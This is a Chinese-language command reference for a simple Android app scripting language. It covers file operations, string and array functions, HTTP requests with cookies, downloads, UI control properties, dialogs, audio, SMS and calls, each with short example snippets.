<p>说明：<br>用于判断指定的文件存在，是否存在返回数值单位(字节)，若获取失败将返回 “-1”。<br>转换为KB：<br>s a = “%abc.zip”<br>fs(a, b)<br>s(b/1024, b)<br>tw(b)</p>
<p>转换为MB：<br>s2(b/1024/1024, b)<br>//保留所有小数<br>sn(b/1024/1024, b2)</p>
<p>【fr 读取文本】<br>用法：(将读取SD卡根目录的abc.txt文件里面的内容)<br>s a = “%abc.txt”<br>fr(a, b)<br>tw(b)</p>
<p>s a = “%abc.txt”<br>s b = “utf-8”<br>fr(a, b, c)<br>tw(c)</p>
<p>说明：<br>用于读取文本文件的数据内容。</p>
<p>【fc 复制文件】<br>用法：（在SD卡根目录abc.txt文件拷贝一个新的副本至abc2.txt）<br>s a = “%abc.txt”<br>s b = “%abc2.txt”<br>fc(a, b, c)</p>
<p>//设置重复不覆盖<br>s c = false<br>fc(a, b, c, d)</p>
<p>说明：<br>用于复制文件，创建一个新的副本文件。是否成功返回数据：true或 false</p>
<p>【fw 写入文本】<br>用法：(将文本数据写入至SD卡根目录的abc.txt文件里面)<br>s a = “%abc.txt”<br>s b = “我是一个txt文件的内容”<br>fw(a, b)</p>
<p>s a = “%abc.txt”<br>s b = “我是一个txt文件的内容”<br>s c = “utf-8”<br>fw(a, b, c)</p>
<p>说明：<br>用于写入文件。</p>
<p>【fl 文件列表】<br>用法：（获取一个目录的文件列表）<br>s a = “%dir”<br>fl(a, b)<br>for(c; b)<br>{<br>    syso(c)<br>}</p>
<p>//仅获取文件夹<br>s a = “%dir”<br>fl(a, true, b)<br>for(c; b)<br>{<br>    syso(c)<br>}</p>
<p>//仅获取文件<br>s a = “%dir”<br>fl(a, false, b)<br>for(c; b)<br>{<br>    syso(c)<br>}</p>
<p>说明：上面例子是获取sd卡根目录文件夹“dir”里面的所有子目录以及文件，并获取结果传入变量“b”，并用for循环，来读取变量“b”里面的列表数据，并把列表数据复制给变量“c”，其中代码会自动创建并赋值好变量：b、c</p>
<p>提示：<br>看似有些复杂，理解了就简单了， 这里的变量“b”类型是一个数组，里面包含了一个数据列表。通过for循环可以顺序读取这个列表。并每次循环把每列的数据赋值给变量“c”</p>
<p>【ft 转移文件】<br>用法：（将SD卡根目录的abc.txt转移至abc3.txt）<br>s a = “%abc.txt”<br>s b = “%abc3.txt”<br>ft(a, b, c)<br>tw(c)</p>
<p>说明：<br>用于转移文件。是否成功返回数据：true或 false</p>
<p>【fdir 获取SD卡根目录路径】<br>用法：（获取根目录路径并赋值至变量“a”）<br>//获取根目录<br>fdir(a)<br>tw(a)</p>
<p>//获取目录的绝对路径<br>s a = “%dir”<br>fdir(a, b)<br>tw(b)</p>
<p>说明：<br>通过获取根目录路径，就可以计算文件的绝对路径。</p>
<p>【fuz 解压zip部分文件】<br>用法：（将根目录文件abc.apk压缩包里的AndroidManifest.xml文件，解压到根目录AndroidManifest2.xml）<br>s a = “%abc.apk”<br>s b = “AndroidManifest.xml”<br>s c = “%AndroidManifest2.xml”<br>fuz(a, b, c, d)<br>tw(d)</p>
<p>//解压文件遇到重复不覆盖<br>s a = “%abc.apk”<br>s b = “AndroidManifest.xml”<br>s c = “%AndroidManifest2.xml”<br>s d = false<br>fuz(a, b, c, d, e)<br>tw(e)</p>
<p>说明：<br>通过上面代码可以实现压缩包解压部分的文件，并返回赋值至变量“d”解压文件的数量。</p>
<p>【fuzs 解压整个zip】<br>用法：(将根目录文件abc.apk压缩包解压至根目录文件夹abcdir，会自动创建)<br>s a = “%abc.apk”<br>s b = “%abcdir”<br>fuzs(a, b, c)<br>tw(c)</p>
<p>//解压文件遇到重复不覆盖<br>s a = “%abc.apk”<br>s b = “%abcdir”<br>s c = false<br>fuzs(a, b, c, d)<br>tw(d)</p>
<p>说明：<br>通过上面代码将解压整个压缩包至指定文件，并赋值至变量“c”，是否成功返回数据：true或 false</p>
<p>【fj 压缩文件或文件夹至zip】<br>用法：<br>s a = “%adc.txt”<br>s b = “%abc.zip”<br>fj(a, b, c)<br>tw(c)</p>
<p>//不去除根目录<br>s a = “%adc.txt”<br>s b = “%abc.zip”<br>s c = false<br>fj(a, b, c, d)<br>tw(d)</p>
<p>说明：<br>压缩文件。返回赋值数据：true 或 false</p>
<p>【fo 打开文件】<br>用法：（将根目录打开安装abc.apk文件）<br>s a = “%abc.apk”<br>fo(a)</p>
<p>说明：<br>可以调用系统工具打开不同的文件。</p>
<p>【s+-*/% 运算方式】<br>用法：<br>s a = 2</p>
<p>//加法例子赋值a=4<br>s+(2, a)<br>//减法例子赋值a=3<br>s-(5, a)<br>//乘法例子赋值a=6<br>s*(3, a)<br>//除法例子赋值a=4<br>s/(8, a)<br>//求余例子赋值a=2<br>s%(5, a)</p>
<p>//其他用法</p>
<p>//加法例子赋值a=7<br>s+(2, 5, a)</p>
<p>//乘法例子赋值b=8，保留小数<br>s*(4, a, true, b)</p>
<p>说明：<br>此方法的效率高于 s计算表达式、sb计算表达式。 在循环数据运行时，是受到推荐的用法。</p>
<p>【s 计算表达式】<br>用法：（用于计算表达式）<br>s a = 12<br>s b = 13<br>s(a + b, c)<br>//将提示：25<br>tw(c)</p>
<p>s a = 60<br>s b = 14<br>s(a / (b + 12), c)<br>//将提示：2 （自动去除了小数）<br>tw(c)</p>
<p>说明：<br>用于计算数据表达式，不支持逻辑表达式计算。</p>
<p>【s2 计算表达式】<br>说明：<br>功能跟上面的一样，但这个会保留2位小数。</p>
<p>【sn 计算表达式】<br>说明：<br>功能跟上面的一样，但保留所有小数。</p>
<p>【ss 变量相加】<br>用法：<br>s a = “123”<br>s b = “789”<br>ss(a + “456” + b, c)<br>//将提示：123456789<br>tw(c)</p>
<p>说明：<br>将字符串数据相连，并赋值至变量“c”。</p>
<p>【sr 替换字符】<br>用法：<br>s a = “123456789”<br>s b = “456”<br>s c = “.”<br>sr(a, b, c, d)</p>
<p>//将提示：123.789<br>tw(d)</p>
<p>//支持正则表达式<br>//sr(a, b, c, true, d)</p>
<p>说明：<br>用于替换字符</p>
<p>【sj 截取字符】<br>用法：<br>s a = “123456789”<br>s b = “34”<br>s c = “8”<br>sj(a, b, c, d)<br>//将提示：567<br>tw(d)</p>
<p>//从头部开始截取<br>sj(a, null, c, d)<br>tw(d)</p>
<p>//截取到尾部<br>sj(a, b, null, d)<br>tw(d)</p>
<p>说明：<br>用于截取数据部分字符</p>
<p>【sl 数据数组】<br>用法：<br>s a = “12;12;12;12;12”<br>s b = “;”<br>sl(a, b, c)</p>
<p>//可以支持正则表达式；例子看（注意说明）<br>//sl(a, b, true, c)</p>
<p>for(d; c)<br>{<br>//将打印5次：12<br>    syso(d)<br>}</p>
<p>说明：<br>将把变量“a”的字符串，切割成一个数组，以字符“.”为分割字符。并用循环顺序打印出数据。</p>
<p>注意：<br>如果支持正则表达式数据数组，上例子的 s b = “;” 其内的值。需要转义的特殊字符 “$()*+.[]?^{},|”</p>
<p>支持正则的特殊字符转义方法：<br>如：<br>s a = “12|a$12|a$12|a$12|a$12”</p>
<p>//关键分割字符串如果包含特殊字符，需要在每个特殊字符前面增加“\”<br>s b = “\|a\$”<br>sl(a, b, true, c)</p>
<p>for(d; c)<br>{<br>//将打印5次：12<br>    syso(d)<br>}</p>
<p>【siof 获取字符位置】<br>用法：<br>s a = “123456789”<br>s b = “3”<br>s c = 0<br>siof(a, b, c, d)<br>//将提示：2<br>tw(d)</p>
<p>s a = “123456789”<br>s b = “3”<br>siof(a, b, c)<br>//将提示：2<br>tw(c)<br>说明：<br>从前面向后面进行匹配。字符位置以0计算，若无数据找到将返回 -1</p>
<p>【slof 获取字符位置】<br>用法：<br>s a = “123456789”<br>s b = “4”<br>s c = 8<br>slof(a, b, c, d)<br>//将提示：3<br>tw(d)</p>
<p>s a = “123456789”<br>s b = “4”<br>slof(a, b, c)<br>//将提示：3<br>tw(c)</p>
<p>说明：<br>从后面向前面进行匹配。字符位置以0计算，若无数据找到将返回 -1</p>
<p>【ssg 截取字符】<br>用法：<br>s a = “abcdefghijk”<br>ssg(a, 2, 6, b)<br>//将提示：cdef<br>tw(b)</p>
<p>s a = “abcdefghijk”<br>ssg(a, 6, b)<br>//将提示：ghijk<br>tw(b)</p>
<p>说明：<br>根据字符的位置进行截取字符，若失败将变量“b”赋值 null</p>
<p>【slg 获取字符长度】<br>用法：<br>s a = “123456789”<br>slg(a, b)<br>//将提示：9<br>tw(b)</p>
<p>说明：<br>顾名思义。</p>
<p>【strim 去除头尾空格】<br>用法：<br>s a = “   123456789 “<br>strim(a, b)<br>//将提示:123456789<br>tw(b)</p>
<p>说明：<br>常用于去除后进行判断头尾字符。</p>
<p>【slower 转换为小写】<br>用法：<br>s a = “AiufSUscN”<br>slower(a, b)<br>//将提示:aiufsuscn<br>tw(b)</p>
<p>说明：<br>常用于转换为小写后进行判断。</p>
<p>【supper 转换为大写】<br>用法：<br>s a = “AiufSUscN”<br>supper(a, b)<br>//将提示:AIUFSUSCN<br>tw(b)</p>
<p>说明：<br>常用于转换为大写后进行判断。</p>
<p>【stop 暂停代码】<br>用法：<br>t()<br>{<br>syso(“1”)</p>
<p>stop(1000)<br>syso(“2”)</p>
<p>stop(1000)<br>syso(“3”)</p>
<p>stop(1000)<br>syso(“4”)<br>}</p>
<p>说明：<br>每次执行 stop(1000) 将暂停1秒后，再执行下面代码。单位为毫秒：1000毫秒 = 1秒</p>
<p>【sran 生产范围随机数】<br>用法：（生产一个 100 至 1000的随机数）<br>sran(100, 1000, a)<br>tw(a)</p>
<p>说明：<br>有时候需要利用到随机机制，可以利用这个来开发！</p>
<p>【nsz 创建数组】<br>用法：<br>s a = 6<br>nsz(a, b)</p>
<p>或</p>
<p>//指定数组数据类型<br>s a = 6<br>nsz(a, “String”, b)</p>
<p>说明：<br>申明一个数组。并且舍子数组总行数为6</p>
<p>【sgsz 指定访问数组维数】<br>用法：（根据序号访问数组）<br>s a = “12;34;56;78;90”<br>s b = “;”<br>sl(a, b, c)<br>sgsz(c, 2, d)<br>tw(d)</p>
<p>说明：<br>数组可以进行列表形式存储数据，常用于数据列表。注意的是序号是从0开始的。数组总行数如果是5，那序号最大为4</p>
<p>【sssz 设置数组数据】<br>用法：<br>s a = 6<br>nsz(a, b)<br>s c = 1<br>s d = “数据”<br>sssz(b, c, d)</p>
<p>说明：<br>指定数组序号设置数组的数据。</p>
<p>【sgszl 访问数组总行数】<br>用法：<br>s a = “12;34;56;78;90”<br>s b = “;”<br>sl(a, b, c)<br>sgszl(c, d)<br>tw(d)</p>
<p>说明：<br>可以获取到长度，更准确的访问数组</p>
<p>【hs 获取网页源码】<br>用法：<br>t()<br>{<br>s a = “<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a><br>hs(a, b)<br>syso(b)<br>}</p>
<p>2，提交post数据:<br>如果参数包含 &amp; 为普通字符，可以进行转义 &amp; 如提交数据:&amp;text=abc&amp;def<br>输入说明：地址，post数据提交，目标网页编码，赋值变量<br>t()<br>{<br>s a = “<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a><br>hs(a, “title=你好&amp;text=你好吗？”, “utf-8”, b)<br>syso(b)<br>}</p>
<p>3，带自定义cookie方式获取网页:<br>//传递cookie项值，格式为nama=value 下例： uid=112;name=nihao;sb=123456789;</p>
<p>t()<br>{<br>s a = “<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a><br>hs(a, “title=你好&amp;text=你好吗？”, “utf-8”, “uid=112;name=nihao;sb=123456789;”, b)<br>syso(b)<br>}</p>
<p>4，带自动设置cookie方式获取网页，并记录当前网页的Cookie:<br>//传递cookie项值，当自定义为null 系统将自动设置已记录的cookie<br>t()<br>{<br>s a = “<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a><br>hs(a, “title=你好&amp;text=你好吗？”, “utf-8”, null, true, b)<br>syso(b)<br>}</p>
<p>5，带自动设置cookie方式获取网页，并记录当前网页的Cookie，并设置Header头:（可设置多条，以“||”隔开）文件头包括了Cookie，User-Agent设备型号。<br>//传递cookie项值，当自定义为null 系统将自动设置已记录的cookie<br>t()<br>{<br>s a = “<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a><br>hs(a, “title=你好&amp;text=你好吗？”, “utf-8”, null, true, “User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||accept=<em>/</em>||accept-language=zh-CN”, b)<br>syso(b)<br>}</p>
<p>6，带自动设置cookie方式获取网页，并记录当前网页的Cookie，并设置Header头:（可设置多条，以“||”隔开）文件头包括了Cookie，User-Agent设备型号，设置连接超时，设置接收超时，设置代理IP。<br>//传递cookie项值，当自定义为null 系统将自动设置已记录的cookie<br>t()<br>{<br>s a = “<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a><br>hs(a, “title=你好&amp;text=你好吗？”, “utf-8”, null, true, “User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||accept=<em>/</em>||accept-language=zh-CN”, 20000, 20000, “10.0.0.172:80”, b)<br>syso(b)<br>}</p>
<p>7，应用系统存储Cookie的浏览查看，返回赋值变量为字符串<br>hs(“cookie”, b)</p>
<p>8，应用系统存储Cookie的清空，无赋值变量<br>hs(“del cookie”)</p>
<p>9，应用系统存储Cookie的浏览查看指定网址，返回赋值变量为字符串<br>hs(“cookie:<a href="https://m.baidu.com&quot;/">https://m.baidu.com&quot;</a>, b)</p>
<p>说明：<br>这里先开了一个线程，然后在线程里执行获取网页源码的工作，开线程是担心有些主线程界面。大部分网页都需要使用cookie登陆，可使用工具查询所需cookie然后进行操作。<br>设置cookie有说明作用？<br>1.登陆用户名<br>2.获取验证码图片并发送验证码<br>….</p>
<p>【hd 下载文件】<br>用法：（下载文件至SD卡根目录 abc.apk）</p>
<p>1，下载文件，默认不覆盖重复<br>t()<br>{<br>s a = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a><br>s b = “abc.apk”<br>hd(a, b, c)<br>syso(c)<br>}</p>
<p>2，设置重复是否覆盖<br>t()<br>{<br>s a = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a><br>s b = “abc.apk”<br>hd(a, b, true, c)<br>syso(c)<br>}</p>
<p>3，带自动设置cookie方式下载网页形式文件（如图片形式验证码，论坛的附件等），支持post数据，自定义Cookie或系统设置Cookie，并记录当前网页的Cookie，并设置重复是否覆盖。可参考hs获取网页，并设置Header头:（可设置多条，以“||”隔开，也可留空为null）<br>输入说明：下载地址，保存文件位置，是否重复覆盖，post数据提交，目标网页编码，自定义Cookie，是否系统自动设置Cookie，设置Header头，赋值变量<br>t()<br>{<br>s a = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a><br>s b = “abc.apk”<br>hd(a, b, true, “title=你好&amp;text=你好吗？”, “utf-8”, null, true, null, b)<br>syso(b)<br>}</p>
<p>说明：<br>开个线程，然后在里面下载一个文件。并存到SD卡。下载结果将赋值到变量“c”<br>返回的赋值：<br>1 文件已经存在<br>0 下载成功<br>-1 下载失败</p>
<p>【hw 访问网页】<br>用法：<br>s a = “<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a><br>hw(a)</p>
<p>说明：<br>使用内置浏览器访问网页。<br>可用于下载文件：<br>s a = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a><br>hw(a)</p>
<p>//跳转访问网页，并且自定义标题栏颜色<br>//主体颜色<br>s b = “#387bd6”<br>//底部横杠颜色<br>s c = “#255eab”<br>hw(“<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a>, b, c)</p>
<p>【hws 系统浏览器访问网页】<br>用法：<br>s a = “<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a><br>hws(a)</p>
<p>说明：<br>使用内置浏览器访问网页。<br>可用于下载文件：<br>s a = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a><br>hws(a)</p>
<p>【ug 获取控件属性】<br>用法：(1为：控件ID，第二个参数为控件属性标识，然后赋值到变量)<br>//<br>ug(1, “text”, c)</p>
<p>//获取侧滑控件 左边的侧滑是否展开状态<br>ug(1, “isdraweropen”, “start”, c)</p>
<p>说明：<br>输入属性标示来返回不同的控件数据。注意：有些控件没有指定属性，将返回null。下面有属性介绍，可参考。</p>
<p>可用属性标识：<br>text=内容、background=背景、width=宽度、height=高度、x=X轴、y=Y轴、paddingleft=左内边距、paddingtop=顶内边距、paddingright右内边距、paddingbottom=底内边距、layout_marginleft=左外边距、layout_margintop=顶外边距、layout_marginright=右外边距、layout_marginbottom=底外边距、<br>hint=提示字符、imeoptions=虚拟键盘按键状态、visibility=控件可视状态、checked=选项是否被选中、title=浏览器网页标题、url=浏览器网址、lastvisibleposition=列表滑动到项目位置的序号、count=列表项目总数、<br>selecteditem=获取下拉框选值、rating=评分当前数值、progress=控件当前进度数值、date=日期控件选值、time=时间控件选值、currentitem=获得滑动窗体界面序号、isdraweropen=侧滑是否界面展开状态、selectionstart=获取文本框光标开始位置、selectionend=获取文本框光标结束位置、<br>cangoback=是否存在可返回的网页、cangoforward=是否存在可前进的网页、collapsecolumns=表格布局获取指定列是否折叠、shrinkcolumns=表格布局获取指定的列是否可收缩、stretchcolumns=表格布局获取指定的列是否可拉伸、shrinkcolumnsall=表格布局获取指示是否所有的列都是可收缩的、<br>stretchcolumnsall=表格布局获取指示是否所有的列都是可拉伸的</p>
<p>【us 设置控件属性】<br>用法：(1为：控件ID，第二个参数为控件属性标识，第三个是需要设置的数据或变量)</p>
<p>//设置文本控件内容<br>s c = “文本内容”<br>us(1, “text”, c)</p>
<p>//关闭下拉刷新加载图标<br>us(1, “refreshing”, false)</p>
<p>//设置浏览器的连接url<br>s c = “<a href="https://m.baidu.com/&quot;">https://m.baidu.com/&quot;</a><br>us(2, “url”, c)<br>//提示：如果浏览器正在播放视频或音乐，直接关闭浏览器可能还会有声音，建议关闭浏览器时先跳转成另一个网页。<br>//提示：如果需要加载本地的文件，可以 us(2, “url”, “file:///android_asset/res/web.html”) 加载安装包内assets/res/web.html文件</p>
<p>//设置浏览器显示的html文件或文本<br>s c = “<html><p>html内容&lt;/&gt;</html>“<br>s d = “utf-8”<br>s e = “text/html”<br>us(2, “url”, c, d, e, f)<br>tw(f)</p>
<p>//设置控件阴影（部分控件有效果如文本、文本框、按钮）<br>s radius = 5<br>s dx = 0<br>s dy = 0<br>s color = “#000000”<br>us(2, “shadow”, radius, dx, dy, color, f)<br>tw(f)</p>
<p>//带有赋值变量，变量d将返回数据是否设置成功 true 或 false<br>s c = “文本内容”<br>us(1, “text”, c, d)</p>
<p>//设置文本框控件光标<br>us(1, “selection”, 1, d)</p>
<p>//选中文本框部分内容<br>us(1, “selection”, 1, 3, d)</p>
<p>//浏览器前进1个网页<br>us(1, “gobackorforward”, 1)</p>
<p>//浏览器后退1个网页<br>us(1, “gobackorforward”, -1)</p>
<p>//设置控件点击波纹效果颜色；需系统5.0以及以上才有效果；部分控件还需要设置 clickable=true 才有效果。<br>us(1, “backgroundripple”, “#888888”)</p>
<p>//设置编辑框光标颜色<br>us(1, “textcursordrawable”, “#000000”)</p>
<p>//自定义文本控件字体<br>us(1, “typeface”, “@ttf.ttf”)</p>
<p>说明：<br>输入控件标示设置控件数据。【可参照控件属性，所有属性标识通用】</p>
<p>更多属性标识：<br>currentitem=设置滑动窗体界面序号、closedrawer=关闭指定侧滑、opendrawer=展开指定侧滑、drawerlockmode=设置手势滑动、selection=设置文本框光标位置、gobackorforward=浏览器的前进或推后、backgroundripple=波纹效果、dh=执行动画（非队列动画）</p>
<p>【uigo 跳转界面】<br>用法：（输入界面文件名，跳转指定的界面）<br>uigo(“abc.iyu”)</p>
<p>//带参数的跳转<br>uigo(“abc.iyu”, 536870912)</p>
<p>说明：<br>可以界面之间的转换，扩展新的界面。</p>
<p>参数：<br>67108864：如果在内存中发现存在该界面，则清空这个界面之上的所有其他界面，使其处于栈顶。<br>268435456：系统会寻找或创建一个新的内存来放置该界面<br>1073741824：跳转到的界面，不排在内存中<br>536870912：当内存中存在该界面并且位手机的显示状态时，不再创建一个新的，直接利用这个界面。</p>
<p>【utw 弹出界面】<br>用法：（在原有的界面弹出界面）<br>s a = null<br>s b = “界面标题”<br>s c = “界面内容”<br>s d = “退出”<br>s e = “保存”<br>s f = “取消”</p>
<p>//三个按钮<br>//输入图标，输入标题，输入内容，输入按钮名称，输入按钮名称，输入按钮名称，输入是否点击弹窗以外界面是否关闭弹窗，输入赋值变量<br>utw(a, b, c, d, e, f, false, v)<br>{<br>syso(“点击了确定”)<br>}<br>else<br>{<br>syso(“点击了保存”)<br>}<br>else<br>{<br>syso(“点击了取消”)<br>}</p>
<p>//两个按钮<br>utw(a, b, c, d, e, false, v)<br>{<br>syso(“点击了确定”)<br>}<br>else<br>{<br>syso(“点击了取消”)<br>}</p>
<p>//一个按钮<br>utw(a, b, c, d, false, v)<br>{<br>syso(“点击了确定”)<br>}</p>
<p>//没有按钮<br>utw(a, b, c, false, v)</p>
<p>//将界面添加到弹窗界面上，直接将界面内容设为一个界面文件<br>s a = “界面标题”<br>s b = “a.iyu”<br>s c = “取消”<br>utw(null, a, b, c, false, v)<br>{<br>syso(“点击了确定”)<br>}</p>
<p>说明：<br>常用于询问用户当前的操作，弹窗展示内容。</p>
<p>赋值变量说明：<br>弹出界面需要设置一个赋值变量，用于自定义界面弹窗的操作。</p>
<p>【endutw 关闭弹出界面】<br>用法：<br>endutw()</p>
<p>说明：<br>用于关闭当前打开的弹窗界面</p>
<p>【end 结束界面】<br>用法：<br>end()</p>
<p>说明：<br>调用后，将结束当前的界面。 并返回原来的界面。如果原来没有界面，将退出应用。</p>
<p>【ends 显示桌面】<br>用法：<br>ends()</p>
<p>说明：<br>跳转到手机的桌面，程序将后台运行。</p>
<p>【bfm 播放音频】<br>用法：<br>s a = “%abc.mp3”<br>bfm(a)</p>
<p>s a = “<a href="http://www.abc.com/abc.mp3&quot;">http://www.abc.com/abc.mp3&quot;</a><br>bfm(a)</p>
<p>s a = “%abc.mp3”<br>bfm(a, b)<br>//播放<br>//bfms(b, “st”)<br>//暂停<br>//bfms(b, “pe”)<br>//停止<br>//bfms(b, “sp”)<br>//结束播放组件<br>//bfms(b, “re”)<br>//是否在播放<br>//bfms(b, “ip”, c)<br>//tw(c)</p>
<p>//获取音频时长（毫秒）<br>//bfms(b, “dn”, c)<br>//tw(c)<br>//获取当前播放时长（毫秒）<br>//bfms(b, “cn”, c)<br>//tw(c)</p>
<p>//指定播放的位置（毫秒）<br>//bfms(b, “seekto”, 2000)</p>
<p>//设置音量（0-100）<br>//bfms(b, “volume”, 100, 100)</p>
<p>//一直循环播放<br>//bfms(b, “sl”, true)</p>
<p>说明：<br>可以直接访问安装包里面的音频文件，也可以访问sd卡上的。</p>
<p>【html标签支持】<br>用法：<br>s a = “(html)<a href="https://m.baidu.com">百度</a>“<br>us(1, “text”, a)</p>
<p>说明：<br>text属性：设置支持html代码！</p>
<p>【ula 列表操作内容】<br>用法：<br>//输入数据列表对象，输入数据项…不限制数量。<br>ula(a, 1=”abc”, 2=”bac”, 3=”bbc”)</p>
<p>//刷新列表显示内容，常用增加数据后的刷新。<br>ula(a)</p>
<p>//清空列表对象<br>ula(a, null)<br>//ula(a, “clear”)</p>
<p>//获得列表对象，赋值返回v变量为列表对象<br>ula(a, “list”, v)</p>
<p>说明：<br>根据数据列表，进行增加数据。</p>
<p>提示：<br>1=abc，其中1为控件id，abc为设置控件值<br>其中所谓的控件，为a.iyu界面中的控件。<br>增加标识数据，不作为设置控件数据，可在标识处设负数。如下：<br>-1=abc</p>
<p>提示：<br>如果需要设置 单选控件、多选控件 的选择状态，可设值为 true 或 false</p>
<p>注意：<br>将要执行事件的控件，必须在此设置值。如你有一个按钮控件无需设置值，但需要使用事件，可设置 1=null<br>不设置值的控件，将无法获取列表内容数据。</p>
<p>【uls 列表显示内容】<br>用法：<br>ula(a, 1=”abc”, 2=”bac”, 3=”bbc”)<br>s c = “a.iyu”<br>s d = -1<br>s e = -2<br>//列表项目界面高度 建议输入 -2 ，如果高度输入 -1 v7列表单项会填充整个界面。项目界面的宽度建议输入 -1<br>//输入控件id或控件对象，输入数据列表，输入列表项界面文件名，输入项目界面宽度，输入项目界面高度<br>uls(1, a, c, d, e)</p>
<p>//设置下拉选择列表<br>s a = “a;b;c”<br>s b = “;”<br>sl(a, b, c)<br>//输入控件id或控件对象，输入数据列表或数组数据<br>uls(1, c)</p>
<p>//自定义标签布局 的子项<br>ula(a, 1=”abc”, 2=”bac”, 3=”bbc”)<br>//输入控件id或控件对象，输入数据列表，输入列表项界面文件名，输入界面宽度，输入界面高度<br>uls(1, a, “a.iyu”, -2, -2)</p>
<p>说明：<br>设置列表控件、视图控件、下拉列表、标签布局 的数据。</p>
<p>注意：<br>列表控件、视图控件 设置的界面 a.iyu 其中的载入事件是允许被调用。<br>可以通过列表控件、视图控件 设置的界面 a.iyu 的载入事件，进行每项列表布局的个性化设计。<br>每当显示到每项列表内容就会调用一次此载入事件，并且将该项的布局控件赋值给 st_vW 变量对象，<br>然后可以通过 gvs(st_vW, a.2, b) 获取其中的子控件对象，然后进行操作子控件即可。<br>还可以通过 st_pN 获取当前的视图中的序号，方便判断目前操作的是那一个视图。</p>
<p>【ulag 获取列表内容数据】<br>用法：</p>
<p>//输入当前的控件对象，输入获取控件ID 1的数据参数，输入赋值变量<br>ulag(a, 1, b)</p>
<p>//输入当前的控件对象，输入获取标识为 -1的数据参数，输入赋值变量<br>ulag(a, -1, b)</p>
<p>//通过 数据列表对象 或 列表控件对象 获取数据<br>//输入数据列表对象 或 列表控件对象，输入视图中的位置序号，输入获取标识为 -1的数据参数，输入赋值变量<br>ulag(a, 1, -1, b)</p>
<p>//如v7列表、滑动窗体控制 的加载界面中的 载入事件里可使用此方法获取数据内容<br>ulag(st_vW, 1, b)</p>
<p>说明：<br>常用与在列表控件的事件中，获取参数数据与用户进行互动。获取失败将赋值变量为 null</p>
<p>注意：<br>使用此方法在uls中设置控件参数后，有设置参数的控件，在事件中可使用此方法。</p>
<p>【ulas 更新列表内容数据】<br>用法：</p>
<p>//输入当前的控件对象，输入获取控件ID 1的数据参数，输入新的数据<br>ulas(a, 1, b)</p>
<p>//输入当前的控件对象，输入获取标识为 -1的数据参数，输入新的数据<br>ulas(a, -1, b)</p>
<p>//通过 数据列表对象 或 列表控件对象 获取数据<br>//输入数据列表对象 或 列表控件对象，输入视图中的位置序号，输入获取标识为 -1的数据参数，输入新的数据<br>ulas(a, 1, -1, b)</p>
<p>//刷新列表显示内容，常用增加数据后的刷新。<br>ula(a)</p>
<p>//如v7列表、滑动窗体控制 的加载界面中的 载入事件里可使用此方法获取数据内容<br>ulas(st_vW, 1, b)</p>
<p>说明：<br>常用与更新修改列表内容数据。修改数据后，别忘记刷新列表。</p>
<p>【usms 发送短信】<br>用法：<br>s a = “10086”<br>s b = “0”<br>usms(a, b)</p>
<p>注意:测试时只显示syso日志，不直接 发送短信，打包即可。</p>
<p>【ucall 拨打电话】<br>用法：<br>s a = “10086”<br>ucall(a)</p>
<p>注意:测试时只显示syso日志，不直接 拨出号码，打包即可。</p>
<p>【time 当前时间】<br>用法：<br>s a = 0<br>time(a, b)<br>tw(b)</p>
<p>说明：<br>第一个参数为时间类型，第二个赋值变量</p>
<p>[数字类型]<br>0：2014-07-07 09:10:08<br>1：2014/07/07 09:10:08<br>2：2014-07-07<br>3：09:10:08<br>4：18144133553151<br>5：2014年07月07日 09:10:08<br>[字符类型，输入字符形式需引号概括]<br>Y 年<br>m 月<br>d 日<br>H 时<br>M 分<br>S 秒<br>a/A 星期几</p>
<p>【fi 判断路径是否文件夹】<br>用法：<br>s a = “abc”<br>fi(a, b)<br>tw(b)</p>
<p>说明：<br>指定路径，判断是否为目录文件夹，返回：true 或 false</p>
<p>【swh 获取屏幕分辨率】<br>用法：<br>s a = “w”<br>//获取屏幕宽度的dp<br>swh(a, w)<br>s a = “h”<br>//获取屏幕高度的dp<br>swh(a, h)<br>s a = “hh”<br>//获取屏幕真实高度的dp<br>swh(a, hh)</p>
<p>s a = “pxw”<br>//获取屏幕宽度的px像素<br>swh(a, w)<br>s a = “pxh”<br>//获取屏幕高度的px像素<br>swh(a, h)<br>s a = “pxhh”<br>//获取屏幕真实高度的px像素<br>swh(a, hh)</p>
<p>s a = “pxztl”<br>//获取屏幕状态栏高度的px像素<br>swh(a, h)</p>
<p>s a = “pxbvk”<br>//获取屏幕底部虚拟键盘的高度的px像素<br>swh(a, h)</p>
<p>说明：<br>常用于获取屏幕的大小。</p>
<p>真实高度：不去除其他系统界面所占用（如状态栏）</p>
<p>【stobm 汉子转换编码字符】<br>用法：（你 转换 %E4%BD%A0）<br>stobm(“你”, “utf-8”, b)<br>tw(b)</p>
<p>//转换网址中的汉字<br>stobm(“你”, “utf-8”, true, b)<br>tw(b)</p>
<p>说明：<br>有些时候网络操作的时候，网址需要带有字符参数，就可以把这个汉字转换下。</p>
<p>【sutf8to 将UTF-8编码字符转换中文】<br>sutf8to(“%E4%BD%A0”, b)<br>tw(b)</p>
<p>//网址中的汉字<br>sutf8to(“%E4%BD%A0”, “utf-8”, true, b)<br>tw(b)</p>
<p>【uycl 隐藏状态栏】<br>用法：<br>//隐藏<br>uycl(true)<br>//不隐藏<br>uycl(false)</p>
<p>说明：<br>隐藏手机顶部的状态栏</p>
<p>【uycl 修改状态栏颜色】<br>用法：<br>//输入更变颜色，并且保留状态栏空间，并默认设置软键盘<br>uycl(“#50c4e5”, true)</p>
<p>//输入更变颜色，并且不保留状态栏空间，并默认设置软键盘<br>uycl(“#50c4e5”, false)</p>
